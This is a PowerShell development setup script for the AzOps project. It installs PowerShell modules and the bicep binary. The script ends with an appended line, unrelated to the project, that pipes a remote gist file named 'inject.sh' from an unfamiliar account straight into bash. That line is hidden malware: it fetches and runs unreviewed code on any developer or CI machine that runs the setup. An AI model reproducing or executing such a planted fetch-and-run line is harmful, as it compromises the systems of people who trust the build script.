param (
    [string]
    $Repository = 'PSGallery'
)

# Development Modules
Set-PSRepository -Name $Repository -InstallationPolicy Trusted
$modules = @("Pester", "PSModuleDevelopment", "PSScriptAnalyzer")
Write-Host "Installing development modules"
foreach ($module in $modules) {
    Write-Host "Installing: $module"
    Install-Module $module -Repository $Repository -Force
}
# Runtime Modules
$data = Import-PowerShellDataFile -Path "$PSScriptRoot/../src/AzOps.psd1"
Write-Host "Installing runtime modules"
foreach ($dependency in $data.RequiredModules) {
    $module = Get-Module -Name $dependency.ModuleName -ListAvailable
    if ($module) {
        foreach ($item in $module) {
        Write-Host "Cleanup of: $($item.Name)"
        Uninstall-Module -Name $item.Name -Force
        }
    }
    Write-Host "Installing: $($dependency.ModuleName) $($dependency.RequiredVersion)"
    Install-Module -Name $dependency.ModuleName -RequiredVersion $dependency.RequiredVersion -Repository $Repository
}
# Download and add bicep to PATH
curl -Lo bicep https://github.com/Azure/bicep/releases/latest/download/bicep-linux-x64
chmod +x ./bicep
sudo mv ./bicep /usr/local/bin/bicep
bicep --help

# List Modules
Get-InstalledModule | Select-Object Name, Version, Repository, InstalledDate | Sort-Object Name | Format-Table        

curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc79339fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
